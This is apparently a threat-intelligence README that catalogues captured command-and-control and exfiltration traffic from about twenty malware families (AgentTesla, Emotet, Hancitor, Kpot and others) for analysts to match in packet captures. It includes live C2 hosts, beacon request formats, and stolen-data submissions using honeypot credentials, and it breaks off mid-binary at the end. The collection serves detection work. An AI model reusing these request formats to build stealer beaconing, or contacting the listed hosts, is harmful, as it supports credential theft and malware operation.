### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)

#### AgentTesla http:
~~~
POST /zin/WebPanel/api.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Content-Type: application/x-www-form-urlencoded
Host: megaplast.co.rs
Content-Length: 308
Expect: 100-continue
Connection: Keep-Alive

HTTP/1.1 100 Continue

p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")

#### AgentTesla smtp exil:
~~~
From: office@larbaxpo[.]com
To: officelogs@larbaxpo[.]com
Date: 9 Oct 2019 17:58:19 +0100
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7

----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/09/2019 17:58:13<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
5.183.107.236=0A<hr>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")

#### Amadey
~~~
POST /madapam/index.php HTTP/1.1
Host: bolsaooma.com
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

id=6289217249&sd=MMMMMM&vs=1.43&ar=0&bi=0&lv=0&os=9&av=0&pc=USER-PC&un=admin&

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 09 Oct 2019 06:20:09 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 6
Connection: close

<c><d>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Amadey")

#### Azorult
POST retrieve metod, unique pattern with lot's of '/' and ')'
~~~
POST /index.php HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
Host: 51.38.76.57
Content-Length: 103
Cache-Control: no-cache

J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")

#### Bladabindi - nJrat
~~~
147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")

#### Blackrat
~~~
9.............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes.............102622021F20414A5644044411072A755821285E472B1826013113651A28101927225D5B1037185F69394B2911291A1A3F031C113F696C1442754978280A031673281879480C2843582C0B032E41737D7E5B5C7A0F7C0D7521
...............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes..........."1A3A0F03142D5055131F585605383F4051

...............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes...........(102622021F20415F0818765B27312642512C3103
...............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes............123C3803363F73570B0552
..$............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")

#### Danabot
Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
~~~
00000000  24 01 00 00 00 00 00 00 e5 7c 00 00 00 00 00 00    $....... .|......
00000010  09 7e 00 00 00 00 00 00                            .~...... 
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/danabot.png "Danabot")

#### Darkcomet
~~~
BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E3C42814BA1D830DF380472AFFBC7F034344A76764BFCC2DC473B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F58C423E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2AC401B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0C4EEFA15FF93BDBE8D0E716D8C7E5F3
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcomet.png "Darkcomet")

#### Darkrat
~~~
POST /request HTTP/1.1
Accept: text/plain
Content-Type: application/x-www-form-urlencoded
User-Agent: agent
Host: 104.244.75.179
Content-Length: 640

request=YUhkcFpEMDVNREExT1dNek55MHhNekl3TFRReFlUUXRZalU0WkMweVlqYzFZVGs0TlRCa01tWW1ZMjl0Y0hWMFpYSnVZVzFsUFZWVFJWSXRVRU1tWVc5eWJtOTBQV1poYkhObEptbHVjM1JoYkd4bFpGSmhiVDB6TGpRNU9UWXhPU1p1WlhSR2NtRnRaWGR2Y21zeVBYUnlkV1VtYm1WMFJuSmhiV1YzYjNKck16MTBjblZsSm01bGRFWnlZVzFsZDI5eWF6TTFQWFJ5ZFdVbWJtVjBSbkpoYldWM2IzSnJORDEwY25WbEptRnVkR2wyYVhKMWN6MG1ZbTkwZG1WeWMybHZiajB5TGpJdU1DWm5jSFZPWVcxbFBXUkhPV3RpZHowOUptTndkVTVoYldVOVUxYzFNRnBYZDI5VmFXdG5VVEk1ZVZwVGFGVlVVMnRuWVZSVmRFNXFVWGROUTBKRVZVWlZaMUZEUVhsTWFtTjNVakJvTmlaaGNtTm9QV1ZFWnpJbWIzQmxjbWx1WjNONWMzUmxiVDFXTW14MVdrYzVNMk41UVROSlJrNXNZMjVhY0ZreVZXZFZSMFpxWVhsQmVDWnpjSEpsWVdSMFlXYzljR0ZzYVhkaA==

HTTP/1.1 200 OK
Date: Tue, 08 Oct 2019 11:25:25 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=hikrbr50pt7ggjr4rcbg40bvl6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkrat.png "Darkrat")

#### DCRat
~~~
GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf97084d3a49a8bf0956f2c744a4a3e0.php?data=active

HTTP/1.1
Host: domalo.online
Connection: Keep-Alive

GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/212bad81b4208a2b412dfca05f1d9fa7.php?type=__ds_setdata&__ds_setdata_user=552b13e67562d7b564b8a0ac9f35c735d17c786b&__ds_setdata_ext=2dce65292845e5dbc41d772bf7f1866e&__ds_setdata_data=%3CSTR%3Esmss.exe%3CSTR%3Esvchost.exe%3CSTR%3Ewinlogon.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Elsm.exe%3CSTR%3Eqemu-ga.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Eexplorer.exe%3CSTR%3ESearchProtocolHost.exe%3CSTR%3Elsass.exe%3CSTR%3Ectfmon.exe%3CSTR%3Edwm.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Eservices.exe%3CSTR%3EWmiPrvSE.exe%3CSTR%3Ewininit.exe%3CSTR%3Espoolsv.exe%3CSTR%3Efsdffc.exe%3CSTR%3ESearchIndexer.exe%3CSTR%3ESearchFilterHost.exe%3CSTR%3Ewindanr.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Etaskeng.exe%3CSTR%3ESystem.exe%3CSTR%3Esvchost.exe%3CSTR%3EIdle.exe 

HTTP/1.1
Host: domalo.online
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")

#### Emotet
~~~
POST /mult/tlb/ HTTP/1.1
Referer: http://69.162.169.173/mult/tlb/
Content-Type: application/x-www-form-urlencoded
DNT: 1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: 69.162.169.173:8080
Content-Length: 468
Connection: Keep-Alive
Cache-Control: no-cache

5Grps=L1sIwg4a7XWGwPpN9LOBzMiBXsZTP33ixo%2FUspmgBLoaYr0K7KnwvoUER9%2B5NzIxpTHgpSTeVRZMm92wSA%2Ff9pG66uhR%2FX%2BGREn%2BVIvlr3LiYQupDVsdexmgD%2FSXdTJ%2FxXNSo5Q52S4HvI9eLtM9s0arCw%2FNNEZlkzp6e8omxU3854YNNNUcAV54N30rgISrXlxvWJz9TP%2FelEcMxMf3hzv91K1Uz8H2KWzWjV2x78pmAG9HGdkFGLaOq6Tqp1LH6Uc7c1gzmZ3Cht2T4cKg06DPDTHkXYj%2F7uCMWAFMO%2FS4QlZl1XKi8MmZck0JAmxsZdGcmIkQoqq5DzFCio6fUAgvqUN3g1%2BP5eXYeZpGu1xIzbWLRG9Wtt2vUOjz4ezl6Z%2B2peN1LKWN%2F8V0CLjxQHhXSu9YZP4g3NIdJ5qofLmM0ipT

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 07 Oct 2019 13:38:33 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 148
Connection: keep-alive

.^ta.I..Z .._AJ*..=._...5-...F.L{>...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\.j?/C......{pi.b....Cz......>D..yQ........G.q...4?..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-1.png "Emotet")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-2.png "Emotet")

#### Evilpony
Follow tcp stream, not http stream in wireshark
~~~
POST /d2/about.php HTTP/1.0
Host: spausence.com
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 337
Content-Type: application/octet-stream
Connection: close
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Content-Encoding: binary

...Q..8.T.f5...~....I..%..`qq...q.^.i.u..v.|34.../t....w....u.}........
6.......
...2..T(.Z.X/..A....55.....>$l
..uE.-..p..
..omvs.S.uYa.Y...............Ezv...B.OM_.X.pg..1...6..}kN..U..%...2.:.H.E......9.k.-.5sD..@.*
	k~........y.s.....@.L+X....wK.O11a.q.$.zd.A...hd9........,. ..(..tP..$.|rS....I.8"
..X!@.	....4N...x.<.......!m~O_.T`.HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:18:05 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.4.45

I6.$...Z,....   
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evilpony.png "Evilpony")

#### Glupteba
~~~
POST /bots/post-ia-data?uuid=de7cfeb2-8d6a-480d-9043-488b8a616d7b HTTP/1.1
Host: venoxcontrol.com
User-Agent: Go-http-client/1.1
Content-Length: 8843
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip

[{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"DXM_Runtime","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Office Proof (French) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Security Update for Microsoft Office 2010 (KB2289078)","display_version":"","install_date":""},{"display_name":"Microsoft Outlook Social Connector (KB2289116) ..........s","display_version":"","install_date":""},{"display_name":"Definition update for Microsoft Office 2010 (KB982726)","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Publisher 2010 (KB2409055)","display_version":"","install_date":""},{"display_name":"IEData","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2151757","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X64 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared 32-bit MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Microsoft Office Professional 2010","display_version":"14.0.4763.1000","install_date":""},{"display_name":"Microsoft Office Publisher MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Outlook MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2202188)","display_version":"","install_date":""},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2467173","display_version":"","install_date":""},{"display_name":"Google Update Helper","display_version":"1.3.33.23","install_date":"20190319"},{"display_name":"IE40","display_version":"","install_date":""},{"display_name":"IE4Data","display_version":"","install_date":""},{"display_name":"Java 8 Update 92 (64-bit)","display_version":"8.0.920.14","install_date":"20180208"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"VLC media player","display_version":"2.2.6","install_date":""},{"display_name":"WinRAR 5.60 (64-bit)","display_version":"5.60.0","install_date":""},{"display_name":"Microsoft Office Single Image 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Access Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Adobe Flash Player 27 PPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X86 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Mozilla Firefox 67.0.4 (x64 en-US)","display_version":"67.0.4","install_date":""},{"display_name":"SchedulingAgent","display_version":"","install_date":""},{"display_name":"Microsoft Office Excel MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Skype... 7.39","display_version":"7.39.102","install_date":"20180208"},{"display_name":"CCleaner","display_version":"5.35","install_date":""},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":"20190321"},{"display_name":"Microsoft Office Access MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"Adobe Acrobat Reader DC MUI","display_version":"15.007.20033","install_date":"20180208"},{"display_name":"MPlayer2","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161","display_version":"9.0.30729.6161","install_date":"20180208"},{"display_name":"Microsoft Office Proofing (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (Spanish) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Adobe Flash Player 27 ActiveX","display_version":"27.0.0.187","install_date":""},{"display_name":"Adobe Flash Player 27 NPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Google Chrome","display_version":"75.0.3770.100","install_date":"20180208"},{"display_name":"Microsoft Office Word MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft OneNote 2010 (KB2433299)","display_version":"","install_date":""},{"display_name":"Microsoft Office OneNote MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB982573","display_version":"","install_date":""},{"display_name":"Realtek AC'97 Audio","display_version":"","install_date":""},{"display_name":"MobileOptionPack","display_version":"","install_date":""},{"display_name":"Microsoft Office PowerPoint MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Update for Microsoft .NET Framework 4.7.2 (KB4087364)","display_version":"1","install_date":""},{"display_name":"Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030","display_version":"11.0.61030.0","install_date":""},{"display_name":"AddressBook","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Word 2010 (KB2345000)","display_version":"","install_date":""},{"display_name":"Microsoft Office Shared Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":""},{"display_name":"Connection Manager","display_version":"","install_date":""},{"display_name":"Fontcore","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"Mozilla Maintenance Service","display_version":"67.0.4","install_date":""},{"display_name":"Notepad++ (64-bit x64)","display_version":"7.5.1","install_date":""},{"display_name":"WIC","display_version":"","install_date":""},{"display_name":"QEMU guest agent","display_version":"2.10.68","install_date":"20190730"},{"display_name":"Update for Microsoft Outlook Social Connector (KB2289116)","display_version":"","install_date":""},{"display_name":"Microsoft Office Office 32-bit Components 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Java Auto Updater","display_version":"2.8.92.14","install_date":"20180208"},{"display_name":"DirectDrawEx","display_version":"","install_date":""},{"display_name":"IE5BAKEX","display_version":"","install_date":""},{"display_name":"Opera 12.15","display_version":"12.15.1748","install_date":""},{"display_name":"Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219","display_version":"10.0.40219","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2005 Redistributable (x64)","display_version":"8.0.61000","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.30501","display_version":"12.0.30501.0","install_date":""}]
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-1.png "Glupteba")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-2.png "Glupteba")

#### Hancitor
~~~
POST /4/forum.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Host: spausence.com
Content-Length: 108
Cache-Control: no-cache

GUID=8996434259757519954&BUILD=0210_328487&INFO=USER-PC @ USER-PC\admin&IP=89.187.165.57&TYPE=1&WIN=6.1(x64)HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:17:51 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.4.45

FFUUARZAEg4OCkBVVQ0NDVQVFB8eEx0TGBUCVBkVF1UNClcZFRQOHxQOVQoWDx0TFAlVCRcbCA5XCRYTHh8IV0lVExQZFg8eHwlVSwYSDg4KQFVVDQ0NVA4SGVcbFBQfAlQZFRdVDQpXGRUUDh8UDlVLBhIODgpAVVUXGw4fCBMbFlcUHwgPHlQID1UNClcTFBkWDx4fCVUKFRcVVUsGEg4OCkBVVRkWHwwfCB8eDxkbDhMVFFQZFRdUGw9VDQpXExQZFg8eHwlVDRMeHR8OCVVLBhIODgpAVVUfGRsIHwoSVBUIHVUNClcZFRQOHxQOVQoWDx0TFAlVGBgKFQ0fCAobGRFVExQZFg8eHwlVSwcBGEASDg4KQFVVDQ0NVBUUHx4THRMYFQJUGRUXVQ0KVxkVFA4fFA5VChYPHRMUCVUJFxsIDlcJFhMeHwhXSVUTFBkWDx4fCVVIBhIODgpAVVUNDQ1UDhIZVxsUFB8CVBkVF1UNClcZFRQOHxQOVUgGEg4OCkBVVRcbDh8IExsWVxQfCA8eVAgPVQ0KVxMUGRYPHh8JVQoVFxVVSAYSDg4KQFVVGRYfDB8IHx4PGRsOExUUVBkVF1QbD1UNClcTFBkWDx4fCVUNEx4dHw4JVUgGEg4OCkBVVR8ZGwgfChJUFQgdVQ0KVxkVFA4fFA5VChYPHRMUCVUYGAoVDR8IChsZEVUTFBkWDx4fCVVIBwEIQBIODgpAVVUNDQ1UFRQfHhMdExgVAlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVQkXGwgOVwkWEx4fCFdJVRMUGRYPHh8JVUkGEg4OCkBVVQ0NDVQOEhlXGxQUHwJUGRUXVQ0KVxkVFA4fFA5VSQYSDg4KQFVVFxsOHwgTGxZXFB8IDx5UCA9VDQpXExQZFg8eHwlVChUXFVVJBhIODgpAVVUZFh8MHwgfHg8ZGw4TFRRUGRUXVBsPVQ0KVxMUGRYPHh8JVQ0THh0fDglVSQYSDg4KQFVVHxkbCB8KElQVCB1VDQpXGRUUDh8UDlUKFg8dExQJVRgYChUNHwgKGxkRVRMUGRYPHh8JVUkH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hancitor.png "Hancitor")

#### Hawkeye keyogger
~~~
From: mosharrof@mhcapparels.com
To: mosharrof@mhcapparels.com
Date: 9 Oct 2019 01:57:35 +0100
Subject: HawkEye Keylogger - Reborn v9 - Passwords Logs - admin \ USER-PC -
 89.187.165.47
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkNClBhc3N3b3JkcyBMb2dzDQphZG1p
biBcIFVTRVItUEMNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")

#### Imminent RAT
~~~
00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")

#### ISRStealer
~~~

GET /boss/index.php?action=add&username=honey@pot.com&password=honeypass356&app=Opera&pcname=USER-PC&sitename=https://www.facebook.com HTTP/1.1
User-Agent: HardCore Software For : Public
Host: expressdeliveryfx.com
Cookie: PHPSESSID=ni2v6p8vt6p48qcvm48rj7qqt0

HTTP/1.1 200 OK
Connection: Keep-Alive
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Tue, 08 Oct 2019 14:06:15 GMT
Server: LiteSpeed
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")

#### Keybase
~~~
GET /panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356 HTTP/1.1
Host: pacificglobal.ga
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 04 Oct 2019 19:55:10 GMT
Content-Type: text/html
Content-Length: 985
Connection: keep-alive
Vary: Accept-Encoding
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-cache

<html><body><script type="text/javascript" src="/aes.js" ></script><script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a=toNumbers("f655ba9d09a112d4968c63579db590b4"),b=toNumbers("98344c2eee86c3994890592585b49f80"),c=toNumbers("ee3d72471e3c40514be9a177719112c3");document.cookie="__test="+toHex(slowAES.decrypt(c,2,a,b))+"; expires=Thu, 31-Dec-37 23:55:55 GMT; path=/"; location.href="http://pacificglobal.ga/panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356&i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")

#### Kpot stealer
Follow tcp stream, not http stream in wireshark
~~~
GET /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Host: allseasongudinc.tech

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 27 Aug 2019 13:52:09 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.1.28

194
KwV4X3wlPk10s8hXH869gjRybIA8vP7vCwSm1Z2WW5LpEMiELVOQvustrfDp9B9igx9Jz8+noWaPlvipqvlX1nEJsgEGpkK29iHNRB5rmSyH9hPAko1ndCVOfVjGwUO/THlWJSdlDlb0FyJA2+ji7xH/Hlcwx38AIJ1SHUpp+hYHUnavdTv5uJnIAoB23+3dt7f1I54mr2Pp+eddWPHgFeIL/2BeLqaWQL1IzY1EqZhS9oIluDYmojSWgWeu6mecE5suxDRksh0KOyA7518HX4ziYflt6gBOa+daqP42C7K7PspsZGUMTRIRKayAQIT84HYmE7a/jRK1twsOz8gdJIrbaOTLaZWx/4q3Nd8bAB2yH8PvCwRz2YVsmzjBv93n3ksOHYuFtO1GcnOk0Igj
0

POST /ImgcsQGM6ZclLvqr/conf.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
Content-Encoding: binary
Host: allseasongudinc.tech
Content-Length: 1965022

P@F,jbhNH2pUP_s..tzH	W-.z.Cb]_u.PBCy9bhNH2pUdoG4PBCy9bhNH2pUdo.r...<|XH	:S.7...U 2'.M.4.!Q.:..!@..*.]
.=.q.:.."G..,.eP+...I.%A3L$OI4l+,.B.@.R+rqh{w@.TP.p.5`]+~
.{vA	TQ.y8.%
A%]>%m.V.GDq.Acn]v.b{vK.U^D{.GbTVs.ZqsO.[]xx.I_W_q.ir{H3Hbn.t6.-#.q...?p.-.r.7'.
